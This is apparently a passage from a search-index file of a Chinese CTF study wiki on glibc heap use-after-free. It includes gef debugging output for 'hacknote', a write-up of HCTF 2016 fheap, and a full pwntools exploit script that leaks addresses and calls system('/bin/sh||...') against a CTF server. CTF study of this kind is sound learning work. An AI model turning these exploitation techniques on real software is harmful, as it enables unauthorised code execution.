'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp \u2190 $esp \u5f53 delete \u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0b bins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684 fast bin \u4e2d\uff0c gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 \u5f53\u6211\u4eec\u5c06 note1 \u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770b bins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684 chunk \u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002 gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b040, size=0x10) \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b050, size=0x28) \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7 note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0b note2 \u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b \u7533\u8bf7 note2 \u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a 0x804b040\uff0c\u5176\u5b9e\u5c31\u662f note1 \u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 0x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 \u7533\u8bf7 note2 \u7684 content \u7684\u5185\u5b58\u5730\u5740\u4e3a 0x804b008\uff0c\u5c31\u662f note0 \u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411 note2 \u7684 content \u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06 note0 \u7684 put \u5b57\u6bb5\u8986\u76d6\u3002 gef\u27a4 n 1 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 0x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684 put \u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3a NULL \u4e86\uff0c\u8fd9\u662f\u7531 fastbin \u7684 free \u673a\u5236\u51b3\u5b9a\u7684\u3002 gef\u27a4 x/2xw 0x804b008 0x804b008: 0x00000000 0x0804b018 \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b gef\u27a4 x/2xw 0x804b008 0x804b008: 0x08048986 0x0804b00a gef\u27a4 x/i 0x08048986 0x8048986 <magic>: push ebp \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684 magic \u51fd\u6570\u4e86\u3002 \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b [+] Starting local process './hacknote': pid 35030 [*] Switching to interactive mode flag{use_after_free}---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9 gef \u7684 heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b gef\u27a4 heap-analysis-helper [*] This feature is under development, expect bugs and unstability... [+] Tracking malloc() [+] Tracking free() [+] Tracking realloc() [+] Disabling hardware watchpoints (this may increase the latency) [+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef\u27a4 c Continuing. [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(32)=0x804b018 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(32)=0x804b050 [+] Heap-Analysis - free(0x804b018) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free(0x804b008) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free(0x804b050) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free(0x804b040) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [New process 36248] process 36248 is executing new program: /bin/dash [New process 36249] process 36249 is executing new program: /bin/cat [Inferior 3 (process 36249) exited normally] \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662f gef \u5de5\u5177\u7684\u95ee\u9898\u3002","title":"\u5229\u7528\u811a\u672c"},{"location":"Pwn/glibc-heap/use_after_free/#_6","text":"","title":"\u9898\u76ee"},{"location":"Pwn/glibc-heap/use_after_free/#2016-hctf-fheap","text":"","title":"2016 HCTF fheap"},{"location":"Pwn/glibc-heap/use_after_free/#_7","text":"1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/use_after_free/#_8","text":"\u9609\u5272\u7248\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u529f\u80fd\u3002 // \u7ba1\u7406\u5806\u7684\u7ed3\u6784\u4f53 struct { int inuse ; String * str ; } Strings [ 0x10 ]; // \u5806\u7ed3\u6784\u4f53 typedef struct String { union { char * buf ; char array [ 16 ]; } o ; int len ; void ( * free )( struct String * ptr ); } String ; create string \u6709\u4e24\u79cd\u4e0d\u540c\u65b9\u5f0f\u6765\u50a8\u5b58\u5b57\u7b26\u4e32\uff1a \u5b57\u7b26\u4e32\u5757 < 16 , \u5728\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u4e0a\u5b58\u653e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u5757>=16 , malloc \u4e00\u4e2a**\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 size** \u7684\u7a7a\u95f4\uff0c \u5c06\u8be5\u7a7a\u95f4\u5730\u5740\u5b58\u653e\u5728\u539f\u6765\u7684\u5806\u5757\u4e2d\u3002 \u6ce8\u610f\u662f malloc \u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6 \uff0c\u800c\u4e0d\u662f\u8f93\u5165\u7684 size \u3002\u81ea\u884c\u6839\u636e\u6e90\u7801\u5206\u6790\uff1a nbytesa = strlen ( & buf ); if ( nbytesa > 15 ) { dest = ( char * ) malloc ( nbytesa ); \u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u4e2a\u5b57\u8282\u5b58\u653e\u7684\u662f free_func \u51fd\u6570\u5730\u5740\uff0c\u7528\u6765\u5728 delete \u7684\u65f6\u5019\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bbe\u8ba1\u4e0e\u4e0a\u9762\u4f8b\u5b50\u4e00\u81f4\u3002\u5b57\u7b26\u4e32\u5757\u4e24\u79cd\u60c5\u51b5\u5bf9\u5e94\u4e24\u79cd\u4e0d\u540c\u7684 free_func \u3002 delete string \u6839\u636e\u8f93\u5165\u4e0b\u6807\u91ca\u653e chunk \u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/use_after_free/#_9","text":"delete \u64cd\u4f5c\u91ca\u653e chunk \u540e\uff0c\u6ca1\u6709\u5c06\u76f8\u5173\u7d22\u5f15\u6307\u9488\u7f6e\u96f6\uff0c\u800c\u4e14\u6ca1\u6709\u5bf9 chunk \u72b6\u6001\u8fdb\u884c\u4e25\u683c\u9650\u5236\uff0c\u4ec5\u4ec5\u9650\u5236\u4e0b\u6807\u8303\u56f4\uff0c\u4ee5\u53ca\u67e5\u8be2\u7d22\u5f15\u6307\u9488\u662f\u5426\u5b58\u5728\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 inuse \u4f4d\uff0c\u9020\u6210 UAF \u3001 Double free \u3002","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/use_after_free/#_10","text":"\u5229\u7528 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u6700\u540e 8 \u5b57\u8282\uff0c\u4fee\u6539 free_func \u4e3a puts \u51fd\u6570\u5730\u5740\u3002\u91ca\u653e chunk \u6cc4\u9732\u51fd\u6570\u771f\u5b9e\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002\u5b8c\u6210\u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u518d\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a printf \u51fd\u6570\uff0c\u6784\u9020\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u4f4d\u4e8e libc \u6bb5\u7684\u5730\u5740\uff0c\u5b8c\u6210 libc \u5730\u5740\u6cc4\u9732\u3002 \u7b2c\u4e09\u6b21 UAF \u63a7\u5236\u7ed3\u6784\u4f53\u5806\u5757\uff08String\uff09\u51fd\u6570\u5730\u5740\u4e3a system \u51fd\u6570\uff0c\u5229\u7528 Linux \u547d\u4ee4\u884c\u7279\u6027 || \u5b8c\u6210 getshell UAF \u63a7\u5236\u601d\u8def\u548c\u4f8b\u9898\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u5982\u679c\u4f7f\u7528\u4e00\u6837\u7684 UAF \u5229\u7528\u65b9\u6cd5\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a add ( 0x30 , 'a' * 0x30 ) #0 add ( 0x30 , 'a' * 0x30 ) #1 delete ( 1 ) delete ( 0 ) add ( 0x18 , 'b' * 0x18 ) \u8fd9\u6837\u4e0d\u80fd\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u65b0\u5806\u7684 string chunk \u7528\u7684\u4e0d\u662f chunk0 \u7ed3\u6784\u4f53\uff0c\u800c\u662f\u7ee7\u7eed\u4f7f\u7528 chunk2 string chunk \u3002\u540e\u7eed\u8bd5\u8fc7\u7533\u8bf7\u5927\u5c0f\u5404\u79cd string chunk \u90fd\u662f\u4e00\u6837\u60c5\u51b5\u3002 \u6240\u4ee5\u91c7\u7528\u7533\u8bf7\u4e24\u4e2a\u5c0f\u5806\uff08\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 16\uff09\uff0c\u7136\u540e\u65b0\u5806\u7533\u8bf7\u4e00\u4e2a 0x20 \u5927\u5c0f\u7a7a\u95f4\u5b58\u653e string \uff0c\u8fd9\u6837 string \u5c31\u4f1a\u4f7f\u7528 chunk1 \u7ed3\u6784\u4f53\u5806\u3002 add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) \u5728 free_short \u9644\u8fd1\u627e\u5230 call puts \u7684\u5730\u5740\uff1a0xd2d \u3002\u7136\u540e\u4f7f\u7528 partial write \u5c06 free_func \u6700\u4f4e\u4e00\u4e2a\u5b57\u8282\u4fee\u6539\u4e3a 0x2d \u3002\u91ca\u653e chunk1 \uff0c\u5c06 chunk1 \u7ed3\u6784\u4f53\u5185\u5bb9\u8f93\u5165\uff0c\u4ece\u800c\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u51fa\u7a0b\u5e8f\u52a0\u8f7d\u57fa\u5730\u5740\u3002 call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr \u91ca\u653e chunk0 \u65b9\u4fbf\u6211\u4eec\u91cd\u590d\u5229\u7528\u8fd9\u4e24\u4e2a\u5806\uff0c\u7136\u540e\u91cd\u590d\u4e0a\u9762\u6b65\u9aa4\u627e\u5230 call printf \uff1a0xDBB \u3002\u9700\u8981\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u7533\u8bf7\u5806\u65f6\u5199\u5165\u5728\u5f00\u5934\u3002\u504f\u79fb\u5730\u5740 gdb \u8c03\u8bd5\u627e\u5230\u4e00\u4e2a libc \u5185\u7684\u5730\u5740\u5373\u53ef\u3002 delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) \u8fd9\u6b65\u7ed3\u675f\u540e\u4f1a\u5361\u8f93\u5165\u6d41\uff0c\u8f93\u5165\u4e24\u884c\u5b57\u7b26\u5373\u53ef\uff1a p . sendline ( 'skye' ) p . sendline ( 'skye' ) \u518d\u6b21\u91ca\u653e chunk0 \u5e76\u7533\u8bf7\uff0c\u8fd9\u6b21\u5c06\u51fd\u6570\u5730\u5740\u4fee\u6539\u4e3a system \u5730\u5740\uff0c/bin/sh \u8f93\u5165\u5728\u5f00\u5934\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u5165\u51fd\u6570\u4e0d\u80fd\u8bfb\u5165 \\x00 \uff0c\u6240\u4ee5\u7528 || \u5206\u9694\u586b\u5145\u5185\u5bb9\uff0c\u539f\u56e0\u5982\u4e0b\uff1a \u5206\u9694\u7b26 \u8bf4\u660e && \u7b2c2\u6761\u547d\u4ee4\u53ea\u6709\u5728\u7b2c1\u6761\u547d\u4ee4\u6210\u529f\u6267\u884c\u4e4b\u540e\u624d\u6267\u884c || \u53ea\u6709 || \u524d\u7684\u547d\u4ee4\u6267\u884c\u4e0d\u6210\u529f\uff08\u4ea7\u751f\u4e86\u4e00\u4e2a\u975e0\u7684\u9000\u51fa\u7801\uff09\u65f6\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002 \uff1b \u5f53;\u53f7\u524d\u7684\u547d\u4ee4\u6267\u884c\u5b8c\uff0c \u4e0d\u7ba1\u662f\u5426\u6267\u884c\u6210\u529f\uff0c\u6267\u884c;\u540e\u7684\u547d\u4ee4","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/use_after_free/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn-f.py from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) # p = process(\"./pwn-f\") p = remote ( \"node3.buuoj.cn\" , 29256 ) elf = ELF ( \"./pwn-f\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"create string\" ) p . recvuntil ( \"size:\" ) p . sendline ( str ( size )) p . recvuntil ( \"str:\" ) p . send ( content ) def delete ( id ): p . recvuntil ( \"3.quit \\n \" ) p . sendline ( \"delete string\" ) p . recvuntil ( \"id:\" ) p . sendline ( str ( id )) p . recvuntil ( \"sure?:\" ) p . sendline ( 'yes' ) # UAF add ( 8 , 'a' * 8 ) add ( 8 , 'b' * 8 ) delete ( 1 ) delete ( 0 ) # overwrite free_func 2 puts call_puts_addr = 0xd2d payload = 'a' * 0x18 + p64 ( call_puts_addr )[ 0 ] add ( len ( payload ), payload ) # leak libc delete ( 1 ) p . recvuntil ( 'a' * 0x18 ) elf_base = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) - call_puts_addr log . info ( \"elf_base:\" + hex ( elf_base )) # printf_plt = elf_base + elf.plt['printf'] # log.info(\"printf_plt:\"+hex(printf_plt)) # overwrite 2 printf leak libc delete ( 0 ) payload = '%22$p' . ljust ( 0x18 , 'a' ) + p64 ( 0xDBB )[ 0 ] add ( len ( payload ), payload ) delete ( 1 ) leak_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_addr = leak_addr - 0x78c0f log . info ( \"libc_addr:\" + hex ( libc_addr )) system_addr = libc_addr + libc . sym [ 'system' ] log . info ( \"system_addr:\" + hex ( system_addr )) str_binsh = libc_addr + libc . search ( '/bin/sh' ) . next () log . info ( \"str_binsh:\" + hex ( str_binsh )) # one = [0x45226,0x4527a,0xf0364,0xf1207] # onegadget = one[0] + libc_addr # log.info(\"onegadget:\"+hex(onegadget)) p . sendline ( 'skye' ) p . sendline ( 'skye' ) # system('/bin/sh||aaa\u2026\u2026') delete ( 0 ) payload = '/bin/sh||' . ljust ( 0x18 , 'a' ) + p64 ( system_addr ) add ( len ( payload ), payload ) # gdb.attach(p,'b *$rebase(0x2020C0)') # # gdb.attach(p,'b *$rebase(0xDBB)') delete ( 1 ) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/use_after_free/#_11","text":"hctf2016 fheap\u5b66\u4e60(FlappyPig\u961f\u4f0d\u7684\u89e3\u6cd5) hctf2016 fheap\u5b66\u4e60(FreeBuf\u53d1\u8868\u7684\u5b98\u65b9\u89e3\u6cd5) DlyELF \u6cc4\u9732 libc \u5730\u5740 hctf2016-fheap Writeup","title":"\u5176\u4ed6\u89e3\u6cd5"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","text":"\u5806\u6982\u8ff0 \u00b6 \u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u4ec0\u4e48\u662f\u5806 \u00b6 \u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c \u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58 \uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58 1 \u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf**\u7533\u8bf7\u5185\u5b58**\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c \u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92 \u3002 